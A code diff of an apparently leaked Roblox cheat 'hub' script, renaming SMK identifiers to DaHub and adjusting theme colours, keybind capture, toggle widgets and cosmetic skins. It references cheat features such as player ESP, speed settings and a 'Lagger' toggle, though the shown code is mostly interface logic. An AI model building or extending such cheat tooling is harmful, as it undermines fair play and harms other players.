-local SMKPaletteKeys = {"C_BG", "C_HEADER", "C_CARD", "C_CARD_HOV", "C_BORDER",
+local DaHubThemeIndex = 1
+local DaHubThemeBases = {}
+local DaHubThemeReverse = {}
+local DaHubPaletteKeys = {"C_BG", "C_HEADER", "C_CARD", "C_CARD_HOV", "C_BORDER",
     "C_HIGHLIGHT", "C_SHADE", "C_HIGHLIGHT_BRIGHT", "C_WHITE", "C_GREY", "C_DIM",
     "C_ACCENT", "C_SEPARATOR_GRAY", "C_CARD_ACTIVE_BG"}
-local SMKPaletteBases = {}
-local function SMKColorKey(color)
+local DaHubPaletteBases = {}
+local function DaHubColorKey(color)
     return string.format("%.6f/%.6f/%.6f", color.R, color.G, color.B)
 end
-local function SMKTint(color)
-    if SMKThemeIndex == 1 then return color end
+local function DaHubTint(color)
+    if DaHubThemeIndex == 1 then return color end
     -- Preserve deliberately colored warning/action states; tint neutral UI roles.
     local high = math.max(color.R, color.G, color.B)
     local low = math.min(color.R, color.G, color.B)
     if high - low > 0.10 then return color end
     local level = (color.R + color.G + color.B) / 3
-    if SMKThemeIndex == 2 then
+    if DaHubThemeIndex == 2 then
         return Color3.new(level, level * 0.48, level * 0.08)
     end
     return Color3.new(level * 0.72, level * 0.32, level)
 end
-local function SMKThemeRGB(r, g, b)
+local function DaHubThemeRGB(r, g, b)
     local base = Color3.fromRGB(r, g, b)
-    local key = SMKColorKey(base)
-    SMKThemeBases[key] = base
-    local color = SMKTint(base)
-    SMKThemeReverse[SMKColorKey(color)] = base
+    local key = DaHubColorKey(base)
+    DaHubThemeBases[key] = base
+    local color = DaHubTint(base)
+    DaHubThemeReverse[DaHubColorKey(color)] = base
     return color
 end
-local function SMKApplyColorTheme(assetId)
+local function DaHubApplyColorTheme(assetId)
     local index
     for i, optionId in ipairs(HUB_COLOR_OPTIONS) do
         if optionId == assetId then index = i; break end
     end
     if not index then return false end
-    local previous = SMKThemeReverse
-    SMKThemeIndex = index
-    SMKThemeReverse = {}
-    for _, base in pairs(SMKThemeBases) do
-        SMKThemeReverse[SMKColorKey(SMKTint(base))] = base
+    local previous = DaHubThemeReverse
+    DaHubThemeIndex = index
+    DaHubThemeReverse = {}
+    for _, base in pairs(DaHubThemeBases) do
+        DaHubThemeReverse[DaHubColorKey(DaHubTint(base))] = base
     end
     -- Explicit assignments also support executors whose script globals differ from _G.
-    C_BG = SMKTint(SMKPaletteBases.C_BG)
-    C_HEADER = SMKTint(SMKPaletteBases.C_HEADER)
-    C_CARD = SMKTint(SMKPaletteBases.C_CARD)
-    C_CARD_HOV = SMKTint(SMKPaletteBases.C_CARD_HOV)
-    C_BORDER = SMKTint(SMKPaletteBases.C_BORDER)
-    C_HIGHLIGHT = SMKTint(SMKPaletteBases.C_HIGHLIGHT)
-    C_SHADE = SMKTint(SMKPaletteBases.C_SHADE)
-    C_HIGHLIGHT_BRIGHT = SMKTint(SMKPaletteBases.C_HIGHLIGHT_BRIGHT)
-    C_WHITE = SMKTint(SMKPaletteBases.C_WHITE)
-    C_GREY = SMKTint(SMKPaletteBases.C_GREY)
-    C_DIM = SMKTint(SMKPaletteBases.C_DIM)
-    C_ACCENT = SMKTint(SMKPaletteBases.C_ACCENT)
-    C_SEPARATOR_GRAY = SMKTint(SMKPaletteBases.C_SEPARATOR_GRAY)
-    C_CARD_ACTIVE_BG = SMKTint(SMKPaletteBases.C_CARD_ACTIVE_BG)
+    C_BG = DaHubTint(DaHubPaletteBases.C_BG)
+    C_HEADER = DaHubTint(DaHubPaletteBases.C_HEADER)
+    C_CARD = DaHubTint(DaHubPaletteBases.C_CARD)
+    C_CARD_HOV = DaHubTint(DaHubPaletteBases.C_CARD_HOV)
+    C_BORDER = DaHubTint(DaHubPaletteBases.C_BORDER)
+    C_HIGHLIGHT = DaHubTint(DaHubPaletteBases.C_HIGHLIGHT)
+    C_SHADE = DaHubTint(DaHubPaletteBases.C_SHADE)
+    C_HIGHLIGHT_BRIGHT = DaHubTint(DaHubPaletteBases.C_HIGHLIGHT_BRIGHT)
+    C_WHITE = DaHubTint(DaHubPaletteBases.C_WHITE)
+    C_GREY = DaHubTint(DaHubPaletteBases.C_GREY)
+    C_DIM = DaHubTint(DaHubPaletteBases.C_DIM)
+    C_ACCENT = DaHubTint(DaHubPaletteBases.C_ACCENT)
+    C_SEPARATOR_GRAY = DaHubTint(DaHubPaletteBases.C_SEPARATOR_GRAY)
+    C_CARD_ACTIVE_BG = DaHubTint(DaHubPaletteBases.C_CARD_ACTIVE_BG)
     local function recolor(color)
-        local base = previous[SMKColorKey(color)] or SMKThemeBases[SMKColorKey(color)]
-        return base and SMKTint(base) or color
+        local base = previous[DaHubColorKey(color)] or DaHubThemeBases[DaHubColorKey(color)]
+        return base and DaHubTint(base) or color
     end
     local roots = {}
     local menuRoot = S.mainMenuFrame and S.mainMenuFrame.Parent
@@ -6845,7 +6230,7 @@ local function SMKApplyColorTheme(assetId)
             end
         end
     end
-    PLAYER_ESP_COLOR = SMKThemeRGB(255, 255, 255)
+    PLAYER_ESP_COLOR = DaHubThemeRGB(255, 255, 255)
     local cache = S.espPlayerCache
     for _, data in pairs(cache and cache.players or {}) do
         if data.box and data.box.Parent then
@@ -6867,21 +6252,21 @@ local function SMKApplyColorTheme(assetId)
 end
 
 -- ── Palette (Premium Glassmorphism) ──────────────────────────────────────
-C_BG       = SMKThemeRGB(0, 0, 0)
-C_HEADER   = SMKThemeRGB(0, 0, 0)
-C_CARD     = SMKThemeRGB(0, 0, 0)
-C_CARD_HOV = SMKThemeRGB(12, 12, 12)
-C_BORDER   = SMKThemeRGB(0, 0, 0)
-C_HIGHLIGHT      = SMKThemeRGB(0, 0, 0)
-C_SHADE  = SMKThemeRGB(0, 0, 0)
-C_HIGHLIGHT_BRIGHT = SMKThemeRGB(0, 0, 0)
-C_WHITE    = SMKThemeRGB(245, 245, 245)
-C_GREY     = SMKThemeRGB(160, 160, 160)
-C_DIM      = SMKThemeRGB(72, 72, 72)
-C_ACCENT   = SMKThemeRGB(0, 0, 0)
-C_SEPARATOR_GRAY = SMKThemeRGB(0, 0, 0)
-C_CARD_ACTIVE_BG = SMKThemeRGB(0, 0, 0)
-SMKPaletteBases = {
+C_BG       = DaHubThemeRGB(0, 0, 0)
+C_HEADER   = DaHubThemeRGB(0, 0, 0)
+C_CARD     = DaHubThemeRGB(0, 0, 0)
+C_CARD_HOV = DaHubThemeRGB(12, 12, 12)
+C_BORDER   = DaHubThemeRGB(0, 0, 0)
+C_HIGHLIGHT      = DaHubThemeRGB(0, 0, 0)
+C_SHADE  = DaHubThemeRGB(0, 0, 0)
+C_HIGHLIGHT_BRIGHT = DaHubThemeRGB(0, 0, 0)
+C_WHITE    = DaHubThemeRGB(245, 245, 245)
+C_GREY     = DaHubThemeRGB(160, 160, 160)
+C_DIM      = DaHubThemeRGB(72, 72, 72)
+C_ACCENT   = DaHubThemeRGB(0, 0, 0)
+C_SEPARATOR_GRAY = DaHubThemeRGB(0, 0, 0)
+C_CARD_ACTIVE_BG = DaHubThemeRGB(0, 0, 0)
+DaHubPaletteBases = {
     C_BG = C_BG,
     C_HEADER = C_HEADER,
     C_CARD = C_CARD,
@@ -6906,18 +6291,18 @@ TABBAR_H = 42
 -- ── Scrolling page factory ────────────────────────────────────────────────
 local DAHUB_NUM_KEYS = {Zero="0",One="1",Two="2",Three="3",Four="4",Five="5",Six="6",Seven="7",Eight="8",Nine="9",
     KeypadZero="Num0",KeypadOne="Num1",KeypadTwo="Num2",KeypadThree="Num3",KeypadFour="Num4",KeypadFive="Num5",KeypadSix="Num6",KeypadSeven="Num7",KeypadEight="Num8",KeypadNine="Num9"}
-function SMKKeyName(k) if not k then return "None" end local n = k.Name; return DAHUB_NUM_KEYS[n] or n end
+function DaHubKeyName(k) if not k then return "None" end local n = k.Name; return DAHUB_NUM_KEYS[n] or n end
 
 -- Shared keybinding capture: one listener, no action while assigning a key.
-SMKBindings = {buttons = setmetatable({}, {__mode = "k"}), active = nil, blockedUntil = 0}
-function SMKBindings.refresh()
-    for button, entry in pairs(SMKBindings.buttons) do
+DaHubBindings = {buttons = setmetatable({}, {__mode = "k"}), active = nil, blockedUntil = 0}
+function DaHubBindings.refresh()
+    for button, entry in pairs(DaHubBindings.buttons) do
         if button.Parent then
-            button.Text = SMKKeyName(entry.kb) .. " / " .. SMKKeyName(entry.gp)
+            button.Text = DaHubKeyName(entry.kb) .. " / " .. DaHubKeyName(entry.gp)
         end
     end
 end
-function SMKBindings.assign(entry, key, isGamepad)
+function DaHubBindings.assign(entry, key, isGamepad)
     if not entry or not key or key == Enum.KeyCode.Unknown or key == Enum.KeyCode.Escape then return false end
     local field = isGamepad and "gp" or "kb"
     local previous = entry[field]
@@ -6926,59 +6311,59 @@ function SMKBindings.assign(entry, key, isGamepad)
         if other ~= entry and other[field] == key then other[field] = previous end
     end
     entry[field] = key
-    SMKBindings.refresh()
+    DaHubBindings.refresh()
     return true
 end
-function SMKBindings.suppressed()
-    return SMKBindings.active ~= nil or tick() < SMKBindings.blockedUntil
+function DaHubBindings.suppressed()
+    return DaHubBindings.active ~= nil or tick() < DaHubBindings.blockedUntil
         or UIS:GetFocusedTextBox() ~= nil
 end
-function SMKBindings.capture(button, entry)
-    local current = SMKBindings.active
+function DaHubBindings.capture(button, entry)
+    local current = DaHubBindings.active
     if current then
         if current.conn then current.conn:Disconnect() end
-        SMKBindings.active = nil
-        SMKBindings.refresh()
+        DaHubBindings.active = nil
+        DaHubBindings.refresh()
         if current.button == button then return end
     end
     local capture = {button = button}
-    SMKBindings.active = capture
+    DaHubBindings.active = capture
     button.Text = "..."
     capture.conn = UIS.InputBegan:Connect(function(input)
         local isGamepad = input.UserInputType == Enum.UserInputType.Gamepad1
         if input.UserInputType ~= Enum.UserInputType.Keyboard and not isGamepad then return end
         if input.KeyCode == Enum.KeyCode.Unknown then return end
         -- Remain blocked for this entire event, regardless of listener order.
-        SMKBindings.blockedUntil = tick() + 0.2
+        DaHubBindings.blockedUntil = tick() + 0.2
         if input.KeyCode ~= Enum.KeyCode.Escape then
-            SMKBindings.assign(entry, input.KeyCode, isGamepad)
+            DaHubBindings.assign(entry, input.KeyCode, isGamepad)
             saveConfig()
         end
         if capture.conn then capture.conn:Disconnect() end
-        SMKBindings.active = nil
-        SMKBindings.refresh()
+        DaHubBindings.active = nil
+        DaHubBindings.refresh()
     end)
     task.delay(10, function()
-        if SMKBindings.active == capture then
+        if DaHubBindings.active == capture then
             if capture.conn then capture.conn:Disconnect() end
-            SMKBindings.active = nil
-            SMKBindings.refresh()
+            DaHubBindings.active = nil
+            DaHubBindings.refresh()
         end
     end)
 end
-function SMKBindings.register(button, entry)
-    SMKBindings.buttons[button] = entry
+function DaHubBindings.register(button, entry)
+    DaHubBindings.buttons[button] = entry
     button.TextSize = 9
     button.TextScaled = true
     local limit = Instance.new("UITextSizeConstraint", button)
     limit.MinTextSize = 8
     limit.MaxTextSize = 10
-    button.Activated:Connect(function() SMKBindings.capture(button, entry) end)
-    SMKBindings.refresh()
+    button.Activated:Connect(function() DaHubBindings.capture(button, entry) end)
+    DaHubBindings.refresh()
 end
 -- End shared keybinding capture.
 
-function SMKSetUserScale(kind, v, persist)
+function DaHubSetUserScale(kind, v, persist)
     if kind ~= "menu" and kind ~= "mobile" then return end
     v = tonumber(v)
     if not v or v ~= v or v == math.huge or v == -math.huge then return end
@@ -6991,8 +6376,8 @@ function SMKSetUserScale(kind, v, persist)
         target = S.floatingPanelFrame
     end
     if target then
-        local sc = target:FindFirstChild("SMKUserScale")
-        if not sc then sc = Instance.new("UIScale"); sc.Name = "SMKUserScale"; sc.Parent = target end
+        local sc = target:FindFirstChild("DaHubUserScale")
+        if not sc then sc = Instance.new("UIScale"); sc.Name = "DaHubUserScale"; sc.Parent = target end
         sc.Scale = v
         if kind == "mobile" and S.refreshMobileBackgroundLayout then
             S.refreshMobileBackgroundLayout()
@@ -7002,7 +6387,7 @@ function SMKSetUserScale(kind, v, persist)
 end
 local function buildGui_createScrollingPages(parent)
     local pages = {}
-    for _, n in ipairs({"Speed","Main","Player","Visual","Move","Config","Keybinds","Music"}) do
+    for _, n in ipairs({"Speed","Main","Player","Visual","Move","Config","Keybinds"}) do
         local sf = Instance.new("ScrollingFrame", parent)
         sf.Size = UDim2.new(1,0,1,0)
         sf.BackgroundTransparency = 1
@@ -7028,7 +6413,7 @@ local function buildGui_createScrollingPages(parent)
     return pages
 end
 
-rowCounts = {Speed=0, Main=0, Player=0, Visual=0, Move=0, Config=0, Keybinds=0, Music=0}
+rowCounts = {Speed=0, Main=0, Player=0, Visual=0, Move=0, Config=0, Keybinds=0}
 
 -- ── Card row ──────────────────────────────────────────────────────────────
 local function mkCard(pg, pages, h)
@@ -7039,15 +6424,15 @@ local function mkCard(pg, pages, h)
     f.BackgroundTransparency = 0.85
     f.BorderSizePixel = 0
     f.LayoutOrder = rowCounts[pg]
-    Instance.new("UICorner", f).CornerRadius = UDim.new(0,12)
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0,8)
     local stroke = Instance.new("UIStroke", f)
-    stroke.Color = SMKThemeRGB(68, 68, 74); stroke.Thickness = 1; stroke.Transparency = 0.55
+    stroke.Color = DaHubThemeRGB(68, 68, 74); stroke.Thickness = 1; stroke.Transparency = 0.55
     -- Subtle inner glow gradient
     local cardGrad = Instance.new("UIGradient", f)
     cardGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, SMKThemeRGB(34, 34, 39)),
-        ColorSequenceKeypoint.new(0.5, SMKThemeRGB(24, 24, 28)),
-        ColorSequenceKeypoint.new(1, SMKThemeRGB(20, 20, 24)),
+        ColorSequenceKeypoint.new(0, DaHubThemeRGB(34, 34, 39)),
+        ColorSequenceKeypoint.new(0.5, DaHubThemeRGB(24, 24, 28)),
+        ColorSequenceKeypoint.new(1, DaHubThemeRGB(20, 20, 24)),
     })
     cardGrad.Rotation = 90
     return f
@@ -7098,33 +6483,33 @@ local function mkToggle(pg, pages, label, defKey, defOn, onToggle, onKeyChanged)
         keyBtn = Instance.new("TextButton", card)
         keyBtn.Size = UDim2.new(0,96,0,28)
         keyBtn.Position = UDim2.new(1,-156,0.5,-14)
-        keyBtn.BackgroundColor3 = SMKThemeRGB(0, 0, 0)
+        keyBtn.BackgroundColor3 = DaHubThemeRGB(0, 0, 0)
         keyBtn.BackgroundTransparency = 0
         keyBtn.BorderSizePixel = 0
         keyBtn.ZIndex = 10
-        keyBtn.Text = SMKKeyName(defKey or Enum.KeyCode.Unknown)
+        keyBtn.Text = DaHubKeyName(defKey or Enum.KeyCode.Unknown)
         keyBtn.TextColor3 = C_GREY
         keyBtn.Font = Enum.Font.GothamBold; keyBtn.TextSize = 9
-        Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0,10)
+        Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0,8)
         local ks = Instance.new("UIStroke", keyBtn)
-        ks.Color = SMKThemeRGB(34, 34, 40)
+        ks.Color = DaHubThemeRGB(34, 34, 40)
         ks.Thickness = 1
         ks.Transparency = 0.52
         ks.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
         for _, entry in pairs(S.KB) do
             if entry.kb == defKey or entry.gp == defKey then
-                SMKBindings.register(keyBtn, entry)
+                DaHubBindings.register(keyBtn, entry)
                 break
             end
         end
     end
 
-    -- Interruptor estilo SMK Leaked: perilla centrada gris apagada y morada encendida.
+    -- Interruptor estilo DaHub Leaked: perilla centrada gris apagada y morada encendida.
     local pillBg = Instance.new("Frame", card)
     pillBg.Size = UDim2.new(0,42,0,22)
     pillBg.AnchorPoint = Vector2.new(1,0.5)
     pillBg.Position = UDim2.new(1,-12,0.5,0)
-    pillBg.BackgroundColor3 = SMKThemeRGB(40,40,40)
+    pillBg.BackgroundColor3 = DaHubThemeRGB(40,40,40)
     pillBg.BackgroundTransparency = 0
     pillBg.BorderSizePixel = 0
     pillBg.ZIndex = 6
@@ -7132,7 +6517,7 @@ local function mkToggle(pg, pages, label, defKey, defOn, onToggle, onKeyChanged)
     Instance.new("UICorner", pillBg).CornerRadius = UDim.new(1,0)
     local pillStroke = Instance.new("UIStroke", pillBg)
     pillStroke.Name = "TrackStroke"
-    pillStroke.Color = SMKThemeRGB(225, 225, 225)
+    pillStroke.Color = DaHubThemeRGB(225, 225, 225)
     pillStroke.Thickness = 1.2
     pillStroke.Transparency = 0.4
     local pillGradient = Instance.new("UIGradient", pillBg)
@@ -7140,16 +6525,16 @@ local function mkToggle(pg, pages, label, defKey, defOn, onToggle, onKeyChanged)
     pillGradient.Rotation = 90
     pillGradient.Enabled = true
     pillGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, SMKThemeRGB(44,44,54)),
-        ColorSequenceKeypoint.new(0.55, SMKThemeRGB(26, 26, 26)),
-        ColorSequenceKeypoint.new(1, SMKThemeRGB(12,12,16)),
+        ColorSequenceKeypoint.new(0, DaHubThemeRGB(44,44,54)),
+        ColorSequenceKeypoint.new(0.55, DaHubThemeRGB(26, 26, 26)),
+        ColorSequenceKeypoint.new(1, DaHubThemeRGB(12,12,16)),
     })
     local dotBack = Instance.new("Frame", pillBg)
     dotBack.Name = "DotBack"
     dotBack.AnchorPoint = Vector2.new(0.5,0.5)
     dotBack.Position = UDim2.new(0.5,0,0.5,1)
     dotBack.Size = UDim2.new(0,15,0,15)
-    dotBack.BackgroundColor3 = SMKThemeRGB(0,0,0)
+    dotBack.BackgroundColor3 = DaHubThemeRGB(0,0,0)
     dotBack.BackgroundTransparency = 0.55
     dotBack.BorderSizePixel = 0
     dotBack.ZIndex = 6
@@ -7159,22 +6544,22 @@ local function mkToggle(pg, pages, label, defKey, defOn, onToggle, onKeyChanged)
     dot.AnchorPoint = Vector2.new(0.5,0.5)
     dot.Position = UDim2.new(0.5,0,0.5,0)
     dot.Size = UDim2.new(0,13,0,13)
-    dot.BackgroundColor3 = SMKThemeRGB(92,92,104)
+    dot.BackgroundColor3 = DaHubThemeRGB(92,92,104)
     dot.BorderSizePixel = 0
     dot.ZIndex = 7
     Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)
     local dotGradient = Instance.new("UIGradient", dot)
-    dotGradient.Name = "SMKDotGradient"
+    dotGradient.Name = "DaHubDotGradient"
     dotGradient.Rotation = 90
     dotGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, SMKThemeRGB(255,255,255)),
-        ColorSequenceKeypoint.new(1, SMKThemeRGB(170,170,180)),
+        ColorSequenceKeypoint.new(0, DaHubThemeRGB(255,255,255)),
+        ColorSequenceKeypoint.new(1, DaHubThemeRGB(170,170,180)),
     })
     local dotGloss = Instance.new("Frame", dot)
-    dotGloss.Name = "SMKPurpleGloss"
+    dotGloss.Name = "DaHubPurpleGloss"
     dotGloss.Size = UDim2.new(0.46,0,0.24,0)
     dotGloss.Position = UDim2.new(0.22,0,0.11,0)
-    dotGloss.BackgroundColor3 = SMKThemeRGB(255,255,255)
+    dotGloss.BackgroundColor3 = DaHubThemeRGB(255,255,255)
     dotGloss.BackgroundTransparency = 0.62
     dotGloss.BorderSizePixel = 0
     dotGloss.ZIndex = 8
@@ -7194,15 +6579,14 @@ local function mkToggle(pg, pages, label, defKey, defOn, onToggle, onKeyChanged)
         dotGradient.Enabled = not on
         dotGloss.BackgroundTransparency = on and 0.8 or 0.38
         pillGradient.Enabled = true
-        -- Estado visual solicitado: activado = blanco puro; desactivado = negro puro.
         pillGradient.Color = on and ColorSequence.new({
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
+            ColorSequenceKeypoint.new(0, DaHubThemeRGB(255,255,255)),
+            ColorSequenceKeypoint.new(1, DaHubThemeRGB(190,190,204)),
         }) or ColorSequence.new({
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0)),
+            ColorSequenceKeypoint.new(0, DaHubThemeRGB(72,72,84)),
+            ColorSequenceKeypoint.new(1, DaHubThemeRGB(28,28,36)),
         })
-        TS_G:Create(pillBg, fadeInfo, {BackgroundColor3 = on and C_WHITE or Color3.fromRGB(0, 0, 0)}):Play()
+        TS_G:Create(pillBg, fadeInfo, {BackgroundColor3 = on and C_WHITE or C_GREY}):Play()
         TS_G:Create(pillStroke, fadeInfo, {
             Color = on and C_HIGHLIGHT_BRIGHT or C_BORDER,
             Transparency = on and 0.1 or 0.38,
@@ -7223,7 +6607,7 @@ local function mkToggle(pg, pages, label, defKey, defOn, onToggle, onKeyChanged)
     clickArea.Size = defKey and UDim2.new(1,-172,1,0) or UDim2.new(1,0,1,0)
     clickArea.BackgroundTransparency = 1; clickArea.Text = ""; clickArea.ZIndex = 8
     local function toggleRow()
-        if SMKBindings.active then return end
+        if DaHubBindings.active then return end
         isOn = not isOn; setV(isOn)
         if onToggle then onToggle(isOn) end
     end
@@ -7258,12 +6642,12 @@ local function mkInput(pg, pages, label, default, onChange, speedKey)
     lbl.TextSize = 11; lbl.TextXAlignment = Enum.TextXAlignment.Left
     local box = Instance.new("TextBox", card)
     box.Size = UDim2.new(0,66,0,26); box.Position = UDim2.new(1,-74,0.5,-13)
-    box.BackgroundColor3 = SMKThemeRGB(18, 18, 18); box.BorderSizePixel = 0
+    box.BackgroundColor3 = DaHubThemeRGB(18, 18, 18); box.BorderSizePixel = 0
     box.Text = tostring(default); box.TextColor3 = C_WHITE
     box.Font = Enum.Font.GothamBlack; box.TextSize = 11
     box.ClearTextOnFocus = false; box.MultiLine = false
     pcall(function() box.ReturnKeyType = Enum.ReturnKeyType.Done end)
-    Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)
     local boxStroke = Instance.new("UIStroke", box)
     boxStroke.Color = C_BORDER; boxStroke.Thickness = 0.8
     local lastVal = tostring(default); local isFocused = false
@@ -7366,12 +6750,12 @@ local function mkActionRow(pg, pages, labelText, keyEntry, onRun)
     if keyEntry then
         local keyBtn = Instance.new("TextButton", card)
         keyBtn.Size = UDim2.new(0,112,0,24); keyBtn.Position = UDim2.new(1,-122,0.5,-12)
-        keyBtn.BackgroundColor3 = SMKThemeRGB(18, 18, 18); keyBtn.BorderSizePixel = 0; keyBtn.ZIndex = 10
-        keyBtn.Text = SMKKeyName(keyEntry.kb or keyEntry.gp or Enum.KeyCode.Unknown)
+        keyBtn.BackgroundColor3 = DaHubThemeRGB(18, 18, 18); keyBtn.BorderSizePixel = 0; keyBtn.ZIndex = 10
+        keyBtn.Text = DaHubKeyName(keyEntry.kb or keyEntry.gp or Enum.KeyCode.Unknown)
         keyBtn.TextColor3 = C_GREY; keyBtn.Font = Enum.Font.GothamBold; keyBtn.TextSize = 9
         Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0,7)
         local ks = Instance.new("UIStroke", keyBtn); ks.Color = C_BORDER; ks.Thickness = 0.8
-        SMKBindings.register(keyBtn, keyEntry)
+        DaHubBindings.register(keyBtn, keyEntry)
     end
     return function(newLabel)
         if lbl and lbl.Parent then lbl.Text = newLabel end
@@ -7384,14 +6768,14 @@ local function buildGui_createMiniToggle(gui, showGuiFn)
     btn.Name = "MiniToggle"
     btn.Size = UDim2.new(0,152,0,40)
     btn.Position = UDim2.new(0,18,0,60)
-    btn.BackgroundColor3 = SMKThemeRGB(12, 12, 16)
+    btn.BackgroundColor3 = DaHubThemeRGB(12, 12, 16)
     btn.BackgroundTransparency = 0.02
     btn.BorderSizePixel = 0
     btn.Text = ""
     btn.AutoButtonColor = false
     btn.ZIndex = 20
     btn.Visible = false
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,20) -- esquinas más redondeadas
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,16)
     local ms = Instance.new("UIStroke", btn)
     ms.Color = C_HIGHLIGHT
     ms.Thickness = 1
@@ -7402,19 +6786,19 @@ local function buildGui_createMiniToggle(gui, showGuiFn)
     titleIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
     titleIcon.Size = UDim2.new(1, 0, 1, 0)
     titleIcon.BackgroundTransparency = 1
-    titleIcon.Text = SMKBrandStyle.text
+    titleIcon.Text = DaHubBrandStyle.text
     titleIcon.Font = Enum.Font.GothamBlack
     titleIcon.TextSize = 20
-    titleIcon.TextColor3 = SMKThemeRGB(255, 255, 255)
+    titleIcon.TextColor3 = DaHubThemeRGB(255, 255, 255)
     titleIcon.ZIndex = 21
-    SMKBrandStyle.apply(titleIcon)
+    DaHubBrandStyle.apply(titleIcon)
     makeDraggable(btn, false)
     btn.MouseButton1Click:Connect(showGuiFn)
     return btn
 end
 
 -- ── Kroblox (ported from Ace Duels) ────────────────────────────────────────
-_G._SMKKrobloxMode = _G._SMKKrobloxMode or "Off"
+_G._DaHubKrobloxMode = _G._DaHubKrobloxMode or "Off"
 DAHUB_KROBLOX_ASSETS = {
     ["Left Leg"] = {
         id = "rbxassetid://139607673", targetBodyPart = "LeftUpperLeg",
@@ -7429,10 +6813,10 @@ DAHUB_KROBLOX_ASSETS = {
         offset = CFrame.new(0, 0, 0) * CFrame.Angles(0, 1.2, 0),
     },
 }
-local function clearSMKKroblox()
+local function clearDaHubKroblox()
     local character = LP.Character
     if not character then return end
-    for _, name in ipairs({"Korblox_LeftLeg", "Korblox_RightLeg", "SMKKroblox_LeftLeg", "SMKKroblox_RightLeg"}) do
+    for _, name in ipairs({"Korblox_LeftLeg", "Korblox_RightLeg", "DaHubKroblox_LeftLeg", "DaHubKroblox_RightLeg"}) do
         local object = character:FindFirstChild(name)
         if object then pcall(function() object:Destroy() end) end
     end
@@ -7445,7 +6829,7 @@ local function clearSMKKroblox()
     end
 end
 
-local function attachSMKKroblox(whichLeg)
+local function attachDaHubKroblox(whichLeg)
     local data = DAHUB_KROBLOX_ASSETS[whichLeg]
     local character = LP.Character
     if not data or not character then return false end
@@ -7477,19 +6861,19 @@ local function attachSMKKroblox(whichLeg)
     return true
 end
 
-_G._SMKApplyKroblox = function(mode)
+_G._DaHubApplyKroblox = function(mode)
     mode = ({Off=true, Left=true, Right=true, Both=true})[mode] and mode or "Off"
-    clearSMKKroblox()
+    clearDaHubKroblox()
     S.krobloxMode = mode
-    _G._SMKKrobloxMode = mode
-    if mode == "Left" or mode == "Both" then pcall(attachSMKKroblox, "Left Leg") end
-    if mode == "Right" or mode == "Both" then pcall(attachSMKKroblox, "Right Leg") end
+    _G._DaHubKrobloxMode = mode
+    if mode == "Left" or mode == "Both" then pcall(attachDaHubKroblox, "Left Leg") end
+    if mode == "Right" or mode == "Both" then pcall(attachDaHubKroblox, "Right Leg") end
 end
 
 LP.CharacterAdded:Connect(function()
     task.wait(0.6)
-    if _G._SMKKrobloxMode ~= "Off" then
-        pcall(_G._SMKApplyKroblox, _G._SMKKrobloxMode)
+    if _G._DaHubKrobloxMode ~= "Off" then
+        pcall(_G._DaHubApplyKroblox, _G._DaHubKrobloxMode)
     end
 end)
 
@@ -7526,18 +6910,12 @@ local function buildSpeedTab(pages)
         if isGp then S.KB.LaggerToggle.gp=k; S.KB.LaggerToggle.kb=nil
         else S.KB.LaggerToggle.kb=k; S.KB.LaggerToggle.gp=nil end; saveConfig()
     end)
-    -- Speed Bypass: control visual seguro. No ejecuta remotes ni spam al servidor.
-    mkSection("Speed", pages, "Speed Bypass")
-    S.speedBypassVisualEnabled = false
-    S.setSpeedBypassVisual, _ = mkToggle("Speed", pages, "Speed Bypass (visual)", nil, false, function(on)
-        S.speedBypassVisualEnabled = on
-    end)
 end
 
 -- ==================== DAHUB BAT SKINS ====================
 do
 -- Complete Bat catalog from the supplied Prime.vs, including original orientation and slash sounds.
-SMKBatSkin = {}
+DaHubBatSkin = {}
 DAHUB_BAT_SKINS = {
     {name = "Off"},
     {
@@ -7553,43 +6931,43 @@ DAHUB_BAT_SKINS = {
         c0 = CFrame.new(),
     },
 }
-SMKBatSkin.cache = {}
-SMKBatSkin.originals = setmetatable({}, {__mode = "k"})
-SMKBatSkin.soundConnections = setmetatable({}, {__mode = "k"})
-SMKBatSkin.watched = setmetatable({}, {__mode = "k"})
+DaHubBatSkin.cache = {}
+DaHubBatSkin.originals = setmetatable({}, {__mode = "k"})
+DaHubBatSkin.soundConnections = setmetatable({}, {__mode = "k"})
+DaHubBatSkin.watched = setmetatable({}, {__mode = "k"})
 
-function SMKBatSkin.smkLoadBatSkin(id)
-    if SMKBatSkin.cache[id] then return SMKBatSkin.cache[id] end
+function DaHubBatSkin.daHubLoadBatSkin(id)
+    if DaHubBatSkin.cache[id] then return DaHubBatSkin.cache[id] end
     local ok, objects = pcall(function() return game:GetObjects(id) end)
     if not ok or type(objects) ~= "table" or #objects == 0 then return nil end
-    SMKBatSkin.cache[id] = objects[1]
+    DaHubBatSkin.cache[id] = objects[1]
     return objects[1]
 end
 
-function SMKBatSkin.smkIsBat(tool)
+function DaHubBatSkin.daHubIsBat(tool)
     return tool and tool:IsA("Tool") and tool.Name:lower() == "bat"
 end
 
-function SMKBatSkin.smkSetBatSlashSound(tool, soundId)
+function DaHubBatSkin.daHubSetBatSlashSound(tool, soundId)
     if not tool then return end
     for _, sound in ipairs(tool:GetDescendants()) do
         if sound:IsA("Sound") and sound.Name == "Slash" then
-            local original = sound:GetAttribute("SMKOriginalSlashSound")
+            local original = sound:GetAttribute("DaHubOriginalSlashSound")
             if soundId then
-                if original == nil then sound:SetAttribute("SMKOriginalSlashSound", sound.SoundId) end
+                if original == nil then sound:SetAttribute("DaHubOriginalSlashSound", sound.SoundId) end
                 sound.SoundId = soundId
             elseif original ~= nil then
                 sound.SoundId = original
